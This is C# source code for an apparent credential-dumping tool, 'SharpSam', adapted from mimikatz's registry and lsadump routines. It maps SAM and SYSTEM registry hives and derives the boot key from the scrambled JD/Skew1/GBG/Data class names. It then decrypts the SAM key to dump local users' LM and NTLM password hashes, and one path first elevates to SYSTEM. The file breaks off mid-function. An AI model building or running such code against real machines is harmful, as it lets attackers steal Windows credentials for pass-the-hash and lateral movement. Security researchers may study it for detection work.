using Microsoft.Win32;
using Microsoft.Win32.SafeHandles;
using System;
using System.Linq;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;


using System.Diagnostics;
using System.ComponentModel;
using System.Security.Principal;
using System.Collections.Generic;
using static SharpSam.Native;

using FILETIME = System.Runtime.InteropServices.ComTypes.FILETIME;

using System.Reflection;


namespace SharpSam
{
    static class Sam
    {
        public static int DOMAIN_GROUP_RID_ADMINS = 0x00000200;

        [DllImport("advapi32.dll")]
        public static extern int RegQueryInfoKey(
            SafeRegistryHandle hKey,
            [Out()] StringBuilder lpClass,
            ref int lpcchClass,
            IntPtr lpReserved,
            IntPtr lpcSubkey,
            IntPtr lpcchMaxSubkeyLen,
            IntPtr lpcchMaxClassLen,
            IntPtr lpcValues,
            IntPtr lpcchMaxValueNameLen,
            IntPtr lpcbMaxValueLen,
            IntPtr lpSecurityDescriptor, IntPtr lpftLastWriteTime);

        public const int BootKeyLength = 16;
        private static readonly string[] BootKeySubKeyNames = { "JD", "Skew1", "GBG", "Data" };
        private static readonly string JDValue = "Lookup";
        private static readonly string GBGValue = "GrafBlumGroup";
        private static readonly string Skew1Value = "SkewMatrix";
        private static readonly string DataValue = "Pattern";
        private static readonly int[] KeyPermutation = { 8, 5, 4, 2, 11, 9, 13, 3, 0, 6, 1, 12, 14, 10, 15, 7 };
        internal const int NTHashNumBits = 128;
        internal const int NTHashNumBytes = NTHashNumBits / 8;
        internal const int LMHashNumBits = 128;
        internal const int LMHashNumBytes = NTHashNumBits / 8;
        internal const int LMPasswordMaxChars = 14;
        internal const int NTPasswordMaxChars = 128;
        private const int MaxRegistryKeyClassSize = 256;

        public const int SYSKEY_LENGTH = 16;
        public const int SAM_KEY_DATA_SALT_LENGTH = 16;

        static string[] SYSKEY_NAMES = { "JD", "Skew1", "GBG", "Data" };
        static byte[] SYSKEY_PERMUT = { 11, 6, 7, 1, 8, 10, 14, 0, 3, 5, 2, 15, 13, 9, 12, 4 };

        public const string lsadump_qwertyuiopazxc = "!@#$%^&*()qwertyUIOPAzxcvbnmQQQQQQQQQQQQ)(*@&%";
        public const string lsadump_01234567890123 = "0123456789012345678901234567890123456789";

        const long GENERIC_READ = (0x80000000L);
        const int OPEN_EXISTING = 3;
        const int KULL_M_REGISTRY_HIVE_VALUE_KEY_FLAG_ASCII_NAME = 0x0001;

        const uint KEY_QUERY_VALUE = (0x0001);
        const uint KEY_SET_VALUE = (0x0002);
        const uint KEY_CREATE_SUB_KEY = (0x0004);
        const uint KEY_ENUMERATE_SUB_KEYS = (0x0008);
        const uint KEY_NOTIFY = (0x0010);
        const uint KEY_CREATE_LINK = (0x0020);
        const uint KEY_WOW64_32KEY = (0x0200);
        const uint KEY_WOW64_64KEY = (0x0100);
        const uint KEY_WOW64_RES = (0x0300);

        const uint AES_BLOCK_SIZE = 16;
        public const uint SAM_KEY_DATA_KEY_LENGTH = 16;

        const long SYNCHRONIZE = (0x00100000L);

        const uint KEY_READ = (uint)((Native.STANDARD_RIGHTS_READ | KEY_QUERY_VALUE | KEY_ENUMERATE_SUB_KEYS | KEY_NOTIFY) & (~SYNCHRONIZE));

        static string[] CONTROLSET_SOURCES = new string[] { "Current", "Default" };

        const uint KULL_M_REGISTRY_HIVE_KEY_NAMED_FLAG_ROOT = 0x0004;
        const uint KULL_M_REGISTRY_HIVE_KEY_NAMED_FLAG_LOCKED = 0x0008;

        const uint KULL_M_REGISTRY_HIVE_KEY_NAMED_FLAG_ASCII_NAME = 0x0020;

        const uint PAGE_READONLY = 0x02;
        const uint PAGE_READWRITE = 0x04;

        const uint FILE_MAP_WRITE = 0x0002;
        const uint FILE_MAP_READ = 0x0004;
        const uint SECTION_MAP_WRITE = 0x0002;
        const uint SECTION_MAP_READ = 0x0004;

        public const uint MD5_DIGEST_LENGTH = 16;

        [StructLayout(LayoutKind.Sequential, Size = 84, Pack = 2)]
        public struct KULL_M_REGISTRY_HIVE_KEY_NAMED
        {
            public int szCell;
            public ushort tag;
            public ushort flags;
            public FILETIME lastModification;
            public uint unk0;
            public int offsetParentKey;
            public uint nbSubKeys;
            public uint nbVolatileSubKeys;
            public int offsetSubKeys;
            public int offsetVolatileSubkeys;
            public uint nbValues;
            public int offsetValues;
            public int offsetSecurityKey;
            public int offsetClassName;
            public uint szMaxSubKeyName;
            public uint szMaxSubKeyClassName;
            public uint szMaxValueName;
            public uint szMaxValueData;
            public uint unk1;
            public ushort szKeyName;
            public ushort szClassName;
            [MarshalAs(UnmanagedType.ByValArray)]
            public byte[] keyName;
        }

        const string lsadump_NTPASSWORD = "NTPASSWORD", lsadump_LMPASSWORD = "LMPASSWORD", lsadump_NTPASSWORDHISTORY = "NTPASSWORDHISTORY", lsadump_LMPASSWORDHISTORY = "LMPASSWORDHISTORY";

        [StructLayout(LayoutKind.Sequential)]
        public struct KIWI_GENERIC_PRIMARY_CREDENTIAL
        {
            public UNICODE_STRING Domaine;
            public UNICODE_STRING UserName;
            public UNICODE_STRING Password;
        }

        public const int LM_NTLM_HASH_LENGTH = 16;

        [StructLayout(LayoutKind.Sequential)]
        public struct KULL_M_REGISTRY_HIVE_VALUE_KEY
        {
            public int szCell;
            public ushort tag;
            public ushort szValueName;
            public uint szData;
            public int offsetData;
            public uint typeData;
            public ushort flags;
            public ushort __align;
            [MarshalAs(UnmanagedType.ByValArray)]
            public byte[] valueName;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct KULL_M_REGISTRY_HIVE_VALUE_LIST
        {
            public int szCell;
            [MarshalAs(UnmanagedType.ByValArray)]
            public int[] offsetValue;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct KULL_M_REGISTRY_HIVE_HANDLE
        {
            public IntPtr hFileMapping;
            public IntPtr pMapViewOfFile;
            public IntPtr pStartOf;//BYTE
            public IntPtr pRootNamedKey;//KULL_M_REGISTRY_HIVE_KEY_NAMED
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct KULL_M_REGISTRY_HANDLE
        {
            public KULL_M_REGISTRY_TYPE type;
            public IntPtr pHandleHive;//KULL_M_REGISTRY_HIVE_HANDLE
        }

        [StructLayout(LayoutKind.Sequential, Pack = 4)]
        public struct KULL_M_REGISTRY_HIVE_BIN_CELL_TAG
        {

            public int szCell;
            public ushort tag;

        }

        [StructLayout(LayoutKind.Sequential)]
        public struct KULL_M_REGISTRY_HIVE_BIN_CELL_DATA
        {
            public int szCell;
            [MarshalAs(UnmanagedType.ByValArray)]
            public byte[] data;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct KULL_M_REGISTRY_HIVE_LF_LH
        {
            public int szCell;
            public ushort tag;
            public ushort nbElements;
            [MarshalAs(UnmanagedType.ByValArray)]
            public KULL_M_REGISTRY_HIVE_LF_LH_ELEMENT[] elements;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct KULL_M_REGISTRY_HIVE_HEADER
        {
            public uint tag;
            uint seqPri;
            uint seqSec;
            FILETIME lastModification;
            uint versionMajor;
            uint versionMinor;
            public uint fileType;
            uint unk0;
            int offsetRootKey;
            uint szData;
            uint unk1;
            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 64)]
            byte[] unk2;
            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 396)]
            byte[] unk3;
            uint checksum;
            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 3584)]
            byte[] padding;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct KULL_M_REGISTRY_HIVE_BIN_HEADER
        {
            public uint tag;
            public int offsetHiveBin;
            uint szHiveBin;
            uint unk0;
            uint unk1;
            FILETIME timestamp;
            uint unk2;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct KULL_M_REGISTRY_HIVE_LF_LH_ELEMENT
        {
            public int offsetNamedKey;
            public int hash;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct DOMAIN_ACCOUNT_F
        {
            public ushort Revision;
            ushort unk0;
            uint unk1;
            OLD_LARGE_INTEGER CreationTime;
            OLD_LARGE_INTEGER DomainModifiedCount;
            OLD_LARGE_INTEGER MaxPasswordAge;
            OLD_LARGE_INTEGER MinPasswordAge;
            OLD_LARGE_INTEGER ForceLogoff;
            OLD_LARGE_INTEGER LockoutDuration;
            OLD_LARGE_INTEGER LockoutObservationWindow;
            OLD_LARGE_INTEGER ModifiedCountAtLastPromotion;
            uint NextRid;
            uint PasswordProperties;
            ushort MinPasswordLength;
            ushort PasswordHistoryLength;
            ushort LockoutThreshold;
            DOMAIN_SERVER_ENABLE_STATE ServerState;
            DOMAIN_SERVER_ROLE ServerRole;
            bool UasCompatibilityRequired;
            uint unk2;
            public SAM_KEY_DATA keys1;
            SAM_KEY_DATA keys2;
            uint unk3;
            uint unk4;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct SAM_KEY_DATA
        {
            public uint Revision;
            uint Length;
            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 16)]
            public byte[] Salt;
            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 16)]
            public byte[] Key;
            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 16)]
            byte[] CheckSum;
            uint unk0;
            uint unk1;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct SAM_KEY_DATA_AES
        {
            uint Revision; // 2
            uint Length;
            uint CheckLen;
            public uint DataLen;
            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 16)]
            public byte[] Salt;
            [MarshalAs(UnmanagedType.ByValArray)]
            public byte[] data; // Data, then Check
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct OLD_LARGE_INTEGER
        {
            uint LowPart;
            int HighPart;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct USER_ACCOUNT_V
        {
            SAM_ENTRY unk0_header;
            public SAM_ENTRY Username;
            SAM_ENTRY Fullname;
            SAM_ENTRY Comment;
            SAM_ENTRY UserComment;
            SAM_ENTRY unk1;
            SAM_ENTRY Homedir;
            SAM_ENTRY HomedirConnect;
            SAM_ENTRY ScriptPath;
            SAM_ENTRY ProfilePath;
            SAM_ENTRY Workstations;
            SAM_ENTRY HoursAllowed;
            SAM_ENTRY unk2;
            public SAM_ENTRY LMHash;
            public SAM_ENTRY NTLMHash;
            public SAM_ENTRY NTLMHistory;
            public SAM_ENTRY LMHistory;
            [MarshalAs(UnmanagedType.ByValArray)]
            public byte[] datas;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct SAM_ENTRY
        {
            public uint offset;
            public uint lenght;
            uint unk;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct SID
        {
            byte Revision;
            byte SubAuthorityCount;
            SID_IDENTIFIER_AUTHORITY IdentifierAuthority;
            [MarshalAs(UnmanagedType.ByValArray)]
            uint[] SubAuthority;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct SID_IDENTIFIER_AUTHORITY
        {
            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 6)]
            byte[] Value;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct KIWI_ENCRYPTED_SUPPLEMENTAL_CREDENTIALS
        {
            uint unk0;
            uint unkSize;
            uint unk1; // flags ?
            public uint originalSize;
            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 16)]
            public byte[] iv;
            [MarshalAs(UnmanagedType.ByValArray)]
            public byte[] encrypted;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct SAM_HASH
        {
            public ushort PEKID;
            public ushort Revision;
            [MarshalAs(UnmanagedType.ByValArray)]
            public byte[] data;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct SAM_HASH_AES
        {
            public ushort PEKID;
            public ushort Revision;
            public uint dataOffset;
            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 16)]
            public byte[] Salt;
            [MarshalAs(UnmanagedType.ByValArray)]
            public byte[] data; // Data
        }


        public enum KULL_M_REGISTRY_TYPE
        {
            KULL_M_REGISTRY_TYPE_OWN,
            KULL_M_REGISTRY_TYPE_HIVE,
        }

        enum DOMAIN_SERVER_ROLE
        {
            DomainServerRoleBackup = 2,
            DomainServerRolePrimary = 3
        }

        enum DOMAIN_SERVER_ENABLE_STATE
        {
            DomainServerEnabled = 1,
            DomainServerDisabled
        }

        public static void do_LsaDump(byte[] bootKey)
        {
            getSamKey_and_getUsers(bootKey);
        }

        public static void do_ElevateLsaDump(byte[] bootKey)
        {
            if (!Elevate.ToSYSTEM())
            {
                Console.WriteLine("[-] couldn't elevate to system");
                return;

            }
            getSamKey_and_getUsers(bootKey);
        }

        public static bool GetBootKey(out byte[] bootKey)
        {
            bootKey = PullBootKey();
            if (bootKey == null)
            {
                Console.WriteLine("Failed to get bootkey");
                return false;
            }
            return true;
        }

        private static void getSamKey_and_getUsers(byte[] bootKey)
        {
            Console.WriteLine($"[+] Decoded bootkey: {string.Format("0x{0:X}", BitConverter.ToString(bootKey, 0).Replace("-", "").ToLower())}");
            IntPtr samKey = RetSamKey(bootKey, (byte[])GetSamSalt());
            if (samKey != IntPtr.Zero)
            {
                Console.WriteLine("[*] Dumping SAM users\n");
                GetSamUsers(samKey);
            }
            CloseHandle(samKey);
        }

        private static IntPtr RegistryOpen(KULL_M_REGISTRY_TYPE regType, IntPtr hAny, bool isWrite)
        {

            bool status = false;
            KULL_M_REGISTRY_HIVE_HEADER pFh = new KULL_M_REGISTRY_HIVE_HEADER();
            KULL_M_REGISTRY_HIVE_BIN_HEADER pBh = new KULL_M_REGISTRY_HIVE_BIN_HEADER();
            KULL_M_REGISTRY_HIVE_KEY_NAMED hkn = new KULL_M_REGISTRY_HIVE_KEY_NAMED();

            IntPtr hRegistry = Marshal.AllocHGlobal(Marshal.SizeOf(typeof(KULL_M_REGISTRY_HANDLE)));
            if (hRegistry != IntPtr.Zero)
            {
                KULL_M_REGISTRY_HANDLE registry = new KULL_M_REGISTRY_HANDLE();
                KULL_M_REGISTRY_HIVE_HANDLE registryHive = new KULL_M_REGISTRY_HIVE_HANDLE();
                registry = (KULL_M_REGISTRY_HANDLE)Marshal.PtrToStructure(hRegistry, typeof(KULL_M_REGISTRY_HANDLE));
                registry.type = regType;
                switch (regType)
                {
                    case KULL_M_REGISTRY_TYPE.KULL_M_REGISTRY_TYPE_OWN:
                        return hRegistry;
                    case KULL_M_REGISTRY_TYPE.KULL_M_REGISTRY_TYPE_HIVE:
                        registry.pHandleHive = Marshal.AllocHGlobal(Marshal.SizeOf(typeof(KULL_M_REGISTRY_HIVE_HANDLE)));
                        if (registry.pHandleHive != IntPtr.Zero)
                        {
                            registryHive.hFileMapping = CreateFileMappingA(hAny, IntPtr.Zero, isWrite ? PAGE_READWRITE : PAGE_READONLY, 0, 0, IntPtr.Zero);
                            if (registryHive.hFileMapping != IntPtr.Zero)
                            {
                                registryHive.pMapViewOfFile = MapViewOfFile(registryHive.hFileMapping, isWrite ? FILE_MAP_WRITE : FILE_MAP_READ, 0, 0, 0);

                                if (registryHive.pMapViewOfFile != IntPtr.Zero)
                                {
                                    pFh = (KULL_M_REGISTRY_HIVE_HEADER)Marshal.PtrToStructure(registryHive.pMapViewOfFile, typeof(KULL_M_REGISTRY_HIVE_HEADER));
                                    if (pFh.tag == 1718052210 && pFh.fileType == 0)
                                    {
                                        IntPtr startof = IntPtr.Add(registryHive.pMapViewOfFile, Marshal.SizeOf(typeof(KULL_M_REGISTRY_HIVE_HEADER)));
                                        pBh = (KULL_M_REGISTRY_HIVE_BIN_HEADER)Marshal.PtrToStructure(startof, typeof(KULL_M_REGISTRY_HIVE_BIN_HEADER));
                                        if (pBh.tag == 1852400232)
                                        {
                                            registryHive.pStartOf = startof;
                                            IntPtr pippo = IntPtr.Add(startof, Marshal.SizeOf(typeof(KULL_M_REGISTRY_HIVE_BIN_HEADER)) + pBh.offsetHiveBin);
                                            registryHive.pRootNamedKey = pippo;
                                            hkn = (KULL_M_REGISTRY_HIVE_KEY_NAMED)Marshal.PtrToStructure(pippo, typeof(KULL_M_REGISTRY_HIVE_KEY_NAMED));
                                            status = (hkn.tag == 27502 && (hkn.flags & (KULL_M_REGISTRY_HIVE_KEY_NAMED_FLAG_ROOT | KULL_M_REGISTRY_HIVE_KEY_NAMED_FLAG_LOCKED)) != 0);

                                            if (status)
                                            {
                                                Marshal.StructureToPtr(registryHive, registry.pHandleHive, false);
                                                Marshal.StructureToPtr(registry, hRegistry, false);
                                                return hRegistry;
                                            }
                                        }
                                    }
                                    if (!status)
                                    {
                                        UnmapViewOfFile(registryHive.pMapViewOfFile);
                                        CloseHandle(registryHive.hFileMapping);
                                    }
                                }
                            }
                        }
                        break;
                    default:
                        break;
                }
                if (!status)
                    Marshal.FreeHGlobal(hRegistry);
            }
            return IntPtr.Zero;
        }

        private static bool RegQueryInfoKey(IntPtr hRegistry, IntPtr hKey, IntPtr lpClass, IntPtr lpcClass, ref uint lpReserved, IntPtr lpcSubKeys, IntPtr lpcMaxSubKeyLen, IntPtr lpcMaxClassLen, IntPtr lpcValues, IntPtr lpcMaxValueNameLen, IntPtr lpcMaxValueLen, IntPtr lpcbSecurityDescriptor, IntPtr lpftLastWriteTime)
        {
            KULL_M_REGISTRY_HANDLE registry = new KULL_M_REGISTRY_HANDLE();
            registry = (KULL_M_REGISTRY_HANDLE)Marshal.PtrToStructure(hRegistry, typeof(KULL_M_REGISTRY_HANDLE));

            bool status = false;
            NTSTATUS dwErrCode;

            int szInCar;

            switch (registry.type)
            {
                case KULL_M_REGISTRY_TYPE.KULL_M_REGISTRY_TYPE_OWN:
                    dwErrCode = (NTSTATUS)RegQueryInfoKeyW(hKey, lpClass, lpcClass, ref lpReserved, lpcSubKeys, lpcMaxSubKeyLen, lpcMaxClassLen, lpcValues, lpcMaxValueNameLen, lpcMaxValueLen, lpcbSecurityDescriptor, lpftLastWriteTime);
                    status = (dwErrCode == NTSTATUS.Success);
                    break;
                case KULL_M_REGISTRY_TYPE.KULL_M_REGISTRY_TYPE_HIVE:
                    KULL_M_REGISTRY_HIVE_HANDLE registryHive = new KULL_M_REGISTRY_HIVE_HANDLE();
                    registryHive = (KULL_M_REGISTRY_HIVE_HANDLE)Marshal.PtrToStructure(registry.pHandleHive, typeof(KULL_M_REGISTRY_HIVE_HANDLE));
                    KULL_M_REGISTRY_HIVE_KEY_NAMED pKn = new KULL_M_REGISTRY_HIVE_KEY_NAMED();
                    if (hKey != IntPtr.Zero)
                        pKn = (KULL_M_REGISTRY_HIVE_KEY_NAMED)Marshal.PtrToStructure(hKey, typeof(KULL_M_REGISTRY_HIVE_KEY_NAMED));
                    else
                        pKn = (KULL_M_REGISTRY_HIVE_KEY_NAMED)Marshal.PtrToStructure(registryHive.pRootNamedKey, typeof(KULL_M_REGISTRY_HIVE_KEY_NAMED));

                    if (pKn.tag == 27502)
                    {
                        status = true;
                        if (lpcSubKeys != IntPtr.Zero)
                            Marshal.WriteInt32(lpcSubKeys, (int)pKn.nbSubKeys);

                        if (lpcMaxSubKeyLen != IntPtr.Zero)
                            Marshal.WriteInt32(lpcMaxSubKeyLen, (int)pKn.szMaxSubKeyName / 2);

                        if (lpcMaxClassLen != IntPtr.Zero)
                            Marshal.WriteInt32(lpcMaxClassLen, (int)pKn.szMaxSubKeyClassName / 2);

                        if (lpcValues != IntPtr.Zero)
                            Marshal.WriteInt32(lpcValues, (int)pKn.nbValues);

                        if (lpcMaxValueNameLen != IntPtr.Zero)
                            Marshal.WriteInt32(lpcMaxValueNameLen, (int)pKn.szMaxValueName / 2);

                        if (lpcMaxValueLen != IntPtr.Zero)
                            Marshal.WriteInt32(lpcMaxValueLen, (int)pKn.szMaxValueData);

                        if (lpcbSecurityDescriptor != IntPtr.Zero)
                            Marshal.WriteInt32(lpcbSecurityDescriptor, 0);  /* NOT SUPPORTED */

                        if (lpftLastWriteTime != IntPtr.Zero)
                            Marshal.WriteInt32(lpcMaxValueLen, 0/*TODO (int)pKn.lastModification*/);

                        if (lpcClass != IntPtr.Zero)
                        {
                            szInCar = pKn.szClassName / 2;
                            if (lpClass != IntPtr.Zero)
                            {
                                if (status = (Marshal.ReadInt32(lpcClass) > szInCar))
                                {
                                    byte[] bincell = GetBinCell(registry.pHandleHive, pKn.offsetClassName, pKn.szClassName).data;
                                    Marshal.Copy(bincell, 0, lpClass, bincell.Length);
                                    Marshal.WriteByte(IntPtr.Add(lpClass, pKn.szClassName + 1), 0x00);
                                }
                            }
                            Marshal.WriteInt32(lpcClass, szInCar);
                        }
                    }
                    break;
                default:
                    break;
            }

            return status;
        }

        private static KULL_M_REGISTRY_HIVE_LF_LH_ELEMENT[] UpdateDataREGISTRY_HIVE_LF_LH_ELEMENT(IntPtr start, int fieldoffset, int count)
        {
            KULL_M_REGISTRY_HIVE_LF_LH_ELEMENT[] elements = new KULL_M_REGISTRY_HIVE_LF_LH_ELEMENT[count];
            byte[] belements = new byte[count * Marshal.SizeOf(typeof(KULL_M_REGISTRY_HIVE_LF_LH_ELEMENT))];
            Marshal.Copy(IntPtr.Add(start, fieldoffset), belements, 0, count * Marshal.SizeOf(typeof(KULL_M_REGISTRY_HIVE_LF_LH_ELEMENT)));
            int index = 0;
            for (int i = 0; i < elements.Length; i++)
            {

                byte[] belem = new byte[Marshal.SizeOf(typeof(KULL_M_REGISTRY_HIVE_LF_LH_ELEMENT))];
                byte[] myb = Utils.GetBytes(belements, index, Marshal.SizeOf(typeof(KULL_M_REGISTRY_HIVE_LF_LH_ELEMENT)));
                elements[i] = Utils.ReadStruct<KULL_M_REGISTRY_HIVE_LF_LH_ELEMENT>(myb);
                index += Marshal.SizeOf(typeof(KULL_M_REGISTRY_HIVE_LF_LH_ELEMENT));
            }
            return elements;
        }

        private static IntPtr SearchKeyNamedInList(KULL_M_REGISTRY_HANDLE registry, IntPtr pHbC, string lpSubKey)
        {
            KULL_M_REGISTRY_HIVE_KEY_NAMED pKn = new KULL_M_REGISTRY_HIVE_KEY_NAMED();
            IntPtr result = IntPtr.Zero;
            KULL_M_REGISTRY_HIVE_LF_LH pLfLh = new KULL_M_REGISTRY_HIVE_LF_LH();
            KULL_M_REGISTRY_HIVE_BIN_CELL_TAG hbC = (KULL_M_REGISTRY_HIVE_BIN_CELL_TAG)Marshal.PtrToStructure(pHbC, typeof(KULL_M_REGISTRY_HIVE_BIN_CELL_TAG));
            string buffer;

            switch (hbC.tag)
            {
                case 26220:
                case 26732:

                    KULL_M_REGISTRY_HIVE_HANDLE registryHive = new KULL_M_REGISTRY_HIVE_HANDLE();
                    registryHive = (KULL_M_REGISTRY_HIVE_HANDLE)Marshal.PtrToStructure(registry.pHandleHive, typeof(KULL_M_REGISTRY_HIVE_HANDLE));

                    pLfLh = (KULL_M_REGISTRY_HIVE_LF_LH)Marshal.PtrToStructure(pHbC, typeof(KULL_M_REGISTRY_HIVE_LF_LH));
                    pLfLh.elements = UpdateDataREGISTRY_HIVE_LF_LH_ELEMENT(pHbC, Utils.FieldOffset<KULL_M_REGISTRY_HIVE_LF_LH>("elements"), pLfLh.nbElements);

                    for (int i = 0; i < pLfLh.nbElements; i++)
                    {

                        pKn = (KULL_M_REGISTRY_HIVE_KEY_NAMED)Marshal.PtrToStructure(IntPtr.Add(registryHive.pStartOf, pLfLh.elements[i].offsetNamedKey), typeof(KULL_M_REGISTRY_HIVE_KEY_NAMED));
                        pKn.keyName = UpdateDataBytes(IntPtr.Add(registryHive.pStartOf, pLfLh.elements[i].offsetNamedKey), Utils.FieldOffset<KULL_M_REGISTRY_HIVE_KEY_NAMED>("keyName"), pKn.szKeyName);
                        if (pKn.tag == 27502)
                        {
                            if ((pKn.flags & KULL_M_REGISTRY_HIVE_KEY_NAMED_FLAG_ASCII_NAME) != 0)
                            {
                                buffer = Encoding.Default.GetString(pKn.keyName);
                            }
                            else
                                buffer = Encoding.Default.GetString(Encoding.Default.GetBytes(Encoding.Unicode.GetString(pKn.keyName)));

                            if (!string.IsNullOrEmpty(buffer))
                            {
                                if (lpSubKey.ToLower().Equals(buffer.ToLower()))
                                {
                                    result = IntPtr.Add(registryHive.pStartOf, pLfLh.elements[i].offsetNamedKey);
                                    break;
                                }
                            }
                        }
                    }
                    break;
                case 26988:
                case 26994:
                default:
                    break;
            }
            return result;
        }

        private static IntPtr RegOpenKeyEx(IntPtr hRegistry, IntPtr hKey, string lpSubKey, uint ulOptions, Native.ACCESS_MASK samDesired)
        {
            NTSTATUS dwErrCode;
            KULL_M_REGISTRY_HIVE_KEY_NAMED pKn = new KULL_M_REGISTRY_HIVE_KEY_NAMED();
            KULL_M_REGISTRY_HIVE_BIN_CELL_TAG pHbC = new KULL_M_REGISTRY_HIVE_BIN_CELL_TAG();
            KULL_M_REGISTRY_HIVE_HANDLE registryHive = new KULL_M_REGISTRY_HIVE_HANDLE();

            KULL_M_REGISTRY_HANDLE registry = new KULL_M_REGISTRY_HANDLE();
            registry = (KULL_M_REGISTRY_HANDLE)Marshal.PtrToStructure(hRegistry, typeof(KULL_M_REGISTRY_HANDLE));
            registryHive = (KULL_M_REGISTRY_HIVE_HANDLE)Marshal.PtrToStructure(registry.pHandleHive, typeof(KULL_M_REGISTRY_HIVE_HANDLE));

            IntPtr phkResult = IntPtr.Zero;
            switch (registry.type)
            {
                case KULL_M_REGISTRY_TYPE.KULL_M_REGISTRY_TYPE_OWN:
                    dwErrCode = (NTSTATUS)RegOpenKeyExW(hKey, lpSubKey, ulOptions, samDesired, phkResult);
                    if (dwErrCode != NTSTATUS.Success)
                        return IntPtr.Zero;
                    break;
                case KULL_M_REGISTRY_TYPE.KULL_M_REGISTRY_TYPE_HIVE:
                    if (hKey != IntPtr.Zero)
                        pKn = (KULL_M_REGISTRY_HIVE_KEY_NAMED)Marshal.PtrToStructure(hKey, typeof(KULL_M_REGISTRY_HIVE_KEY_NAMED));
                    else
                    {
                        pKn = (KULL_M_REGISTRY_HIVE_KEY_NAMED)Marshal.PtrToStructure(registryHive.pRootNamedKey, typeof(KULL_M_REGISTRY_HIVE_KEY_NAMED));
                    }

                    if (pKn.tag == 27502)
                    {
                        if (!string.IsNullOrEmpty(lpSubKey))
                        {
                            if (pKn.nbSubKeys != 0 && (pKn.offsetSubKeys != -1))
                            {
                                pHbC = (KULL_M_REGISTRY_HIVE_BIN_CELL_TAG)Marshal.PtrToStructure(IntPtr.Add(registryHive.pStartOf, pKn.offsetSubKeys), typeof(KULL_M_REGISTRY_HIVE_BIN_CELL_TAG));

                                IntPtr dest = IntPtr.Zero;
                                if (lpSubKey.IndexOf('\\') > 0)
                                {
                                    string buffer = lpSubKey.Substring(0, lpSubKey.IndexOf('\\'));
                                    string buffer2 = lpSubKey.Substring(lpSubKey.IndexOf('\\') + 1);
                                    phkResult = Marshal.AllocHGlobal(Marshal.SizeOf(typeof(KULL_M_REGISTRY_HIVE_KEY_NAMED)));
                                    dest = IntPtr.Add(registryHive.pStartOf, pKn.offsetSubKeys);
                                    phkResult = SearchKeyNamedInList(registry, dest, buffer);
                                    phkResult = RegOpenKeyEx(hRegistry, phkResult, buffer2, ulOptions, samDesired);
                                }
                                else
                                {
                                    phkResult = Marshal.AllocHGlobal(Marshal.SizeOf(typeof(KULL_M_REGISTRY_HIVE_KEY_NAMED)));
                                    dest = IntPtr.Add(registryHive.pStartOf, pKn.offsetSubKeys);
                                    phkResult = SearchKeyNamedInList(registry, dest, lpSubKey);
                                }
                            }
                        }
                        else
                        {
                            if (hKey != IntPtr.Zero)
                                phkResult = hKey;
                            else
                            {
                                phkResult = registryHive.pRootNamedKey;
                            }

                        }
                    }
                    return phkResult;
                default:
                    break;
            }
            return IntPtr.Zero;
        }

        private static bool QueryWithAlloc(IntPtr hRegistry, IntPtr hKey, string lpValueName, ref uint lpType, ref IntPtr lpData, ref uint szNeeded)
        {
            IntPtr nope = IntPtr.Zero;
            if (RegQueryValueEx(hRegistry, hKey, lpValueName, IntPtr.Zero, ref lpType, ref nope, ref szNeeded))
            {
                if (szNeeded != 0)
                {
                    lpData = Marshal.AllocHGlobal((int)szNeeded);
                    bool status = RegQueryValueEx(hRegistry, hKey, lpValueName, IntPtr.Zero, ref lpType, ref lpData, ref szNeeded);
                    if (status)
                    {
                        return true;
                    }
                    else
                    {
                        Console.WriteLine("RegQueryValueEx KO");
                    }

                }
            }
            else Console.WriteLine("Before RegQueryValueEx KO");
            return false;
        }

        private static int[] UpdateDataInt(IntPtr start, int fieldoffset, int count)
        {
            int[] elements = new int[count];
            byte[] belements = new byte[count * Marshal.SizeOf(typeof(int))];
            Marshal.Copy(IntPtr.Add(start, fieldoffset), belements, 0, count * Marshal.SizeOf(typeof(int)));
            int index = 0;
            for (int i = 0; i < elements.Length; i++)
            {

                byte[] belem = new byte[Marshal.SizeOf(typeof(int))];
                byte[] myb = Utils.GetBytes(belements, index, Marshal.SizeOf(typeof(int)));
                elements[i] = BitConverter.ToInt32(myb, 0);
                index += Marshal.SizeOf(typeof(int));
            }
            return elements;
        }

        private static IntPtr SearchValueNameInList(IntPtr hRegistry, IntPtr hKey, string lpValueName)
        {
            KULL_M_REGISTRY_HANDLE registry = new KULL_M_REGISTRY_HANDLE();
            registry = (KULL_M_REGISTRY_HANDLE)Marshal.PtrToStructure(hRegistry, typeof(KULL_M_REGISTRY_HANDLE));
            KULL_M_REGISTRY_HIVE_HANDLE registryHive = new KULL_M_REGISTRY_HIVE_HANDLE();
            registryHive = (KULL_M_REGISTRY_HIVE_HANDLE)Marshal.PtrToStructure(registry.pHandleHive, typeof(KULL_M_REGISTRY_HIVE_HANDLE));
            KULL_M_REGISTRY_HIVE_KEY_NAMED pKn = new KULL_M_REGISTRY_HIVE_KEY_NAMED();
            if (hKey == IntPtr.Zero)
                pKn = (KULL_M_REGISTRY_HIVE_KEY_NAMED)Marshal.PtrToStructure(registryHive.pRootNamedKey, typeof(KULL_M_REGISTRY_HIVE_KEY_NAMED));
            else
